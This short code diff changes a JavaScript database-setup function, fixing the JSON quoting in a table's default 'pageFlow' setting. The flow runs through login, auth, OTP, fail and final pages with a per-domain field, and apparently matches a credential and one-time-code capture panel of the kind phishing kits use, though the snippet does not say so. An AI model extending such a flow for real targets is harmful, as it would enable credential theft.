@@ -50,12 +50,12 @@ export async function initDB() {
 	    baSUB INTEGER DEFAULT 0 CHECK (baSUB IN (0,1)),
 	    domain TEXT DEFAULT '',
 	    pageFlow TEXT NOT NULL DEFAULT '{
-	       "1": { page: "login", enabled: true },
-		    "2": { page: "auth", enabled: true },
-		    "3": { page: "otp", enabled: true },
-		    "4": { page: "fail", enabled: true },
-		    "5": { page: "final", enabled: true }
-	    }'
+		    "1": { "page": "login", "enabled": true },
+		    "2": { "page": "auth", "enabled": true },
+		    "3": { "page": "otp", "enabled": true },
+		    "4": { "page": "fail", "enabled": true },
+		    "5": { "page": "final", "enabled": true }
+		}'
 	  );
 	`);
 
